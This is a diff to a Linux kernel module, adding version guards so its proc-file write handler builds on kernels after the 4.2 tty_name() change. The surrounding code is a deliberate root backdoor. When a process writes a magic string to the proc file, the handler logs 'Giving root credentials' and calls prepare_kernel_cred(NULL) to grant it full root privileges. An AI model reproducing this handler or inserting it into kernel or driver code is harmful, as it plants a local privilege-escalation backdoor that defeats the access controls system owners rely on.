@@ -62,8 +62,13 @@ proc_setroot_proc_write(struct file *file, const char __user *buf, size_t size, 
 	size_t magiclen = strlen(magic);
 	char *kbuffer;
 	bool is_equal;
-	char ttybuffer[sizeof(current->signal->tty->name)];
 	struct cred *creds;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 2, 0)
+	/* tty_name parameter has been removed by commit 917162c93693
+	 * ("tty: return tty->name directly from tty_name")
+	 */
+	char ttybuffer[sizeof(current->signal->tty->name)];
+#endif
 
 	if (*ppos)
 		return -EINVAL;
@@ -89,7 +94,12 @@ proc_setroot_proc_write(struct file *file, const char __user *buf, size_t size, 
 	if (is_equal) {
 		pr_info("Giving root credentials to uid:%u, pid:%d, tty:%s\n",
 			from_kuid(&init_user_ns, current_uid()), current->pid,
-			tty_name(current->signal->tty, ttybuffer));
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 2, 0)
+			tty_name(current->signal->tty, ttybuffer)
+#else
+			tty_name(current->signal->tty)
+#endif
+			);
 		creds = prepare_kernel_cred(NULL);
 		if (!creds)
 			return -ENOMEM;
